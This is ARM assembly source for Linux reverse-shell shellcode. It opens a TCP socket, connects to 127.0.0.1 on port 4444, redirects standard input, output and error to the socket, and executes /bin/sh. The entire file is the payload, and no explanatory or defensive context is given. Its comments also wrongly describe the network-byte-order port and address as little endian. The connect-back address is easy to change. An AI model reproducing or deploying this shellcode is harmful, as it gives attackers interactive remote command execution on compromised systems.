.section .text
.global _start

_start:
    .ARM
    .code 32

    @ --- Stage 1: Create Socket (socket(AF_INET, SOCK_STREAM, IPPROTO_IP)) ---
    mov r0, #2          @ arg0: domain (AF_INET = 2)
    mov r1, #1          @ arg1: type (SOCK_STREAM = 1)
    mov r2, #0          @ arg2: protocol (IPPROTO_IP = 0)
    movw r7, #281        @ syscall: socket (SYS_SOCKET)
    svc #0              @ execute syscall
    mov r4, r0          @ save socket_fd in r4 (returned in r0)

    @ --- Stage 2: Connect to remote host (connect(socket_fd, &sockaddr, sizeof(sockaddr))) ---
    mov r0, r4          @ arg0: socket_fd (from r4)
    adr r1, sockaddr    @ arg1: address of sockaddr (load from static data)
    mov r2, #16         @ arg2: addrlen (sizeof(sockaddr_in) = 16)
    movw r7, #283        @ syscall: connect (SYS_CONNECT)
    svc #0              @ execute syscall

    @ --- Stage 3: Duplicate file descriptors (dup2(socket_fd, 0), dup2(socket_fd, 1), dup2(socket_fd, 2)) ---
    @ dup2(oldfd, newfd)
    mov r0, r4          @ arg0: oldfd (socket_fd)
    mov r1, #0          @ arg1: newfd (STDIN_FILENO)
    mov r7, #63         @ syscall: dup2 (SYS_DUP2)
    svc #0

    mov r0, r4          @ arg0: oldfd (socket_fd)
    mov r1, #1          @ arg1: newfd (STDOUT_FILENO)
    mov r7, #63         @ syscall: dup2 (SYS_DUP2)
    svc #0

    mov r0, r4          @ arg0: oldfd (socket_fd)
    mov r1, #2          @ arg1: newfd (STDERR_FILENO)
    mov r7, #63         @ syscall: dup2 (SYS_DUP2)
    svc #0

    @ --- Stage 4: Execute /bin/sh (execve("/bin/sh", NULL, NULL)) ---
    @ execve(const char *filename, char *const argv[], char *const envp[])

    @ Get address of "/bin/sh" string
    adr r0, bin_sh_path @ arg0: filename (pointer to "/bin/sh")

    eor r1, r1, r1      @ arg1: argv (NULL) - clear r1
    eor r2, r2, r2      @ arg2: envp (NULL) - clear r2

    mov r7, #11         @ syscall: execve (SYS_EXECVE)
    svc #0              @ execute syscall

    @ --- Data section ---
    .align 4
sockaddr:
    .byte 0x02, 0x00    @ AF_INET (2)
    .byte 0x11, 0x5c    @ port 4444 (0x115c) - little endian representation
    .byte 0x7f, 0x00, 0x00, 0x01 @ 127.0.0.1 - little endian representation
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 @ sin_zero padding

    .align 4
bin_sh_path:
    .asciz "/bin/sh"    @ Null-terminated string "/bin/sh"
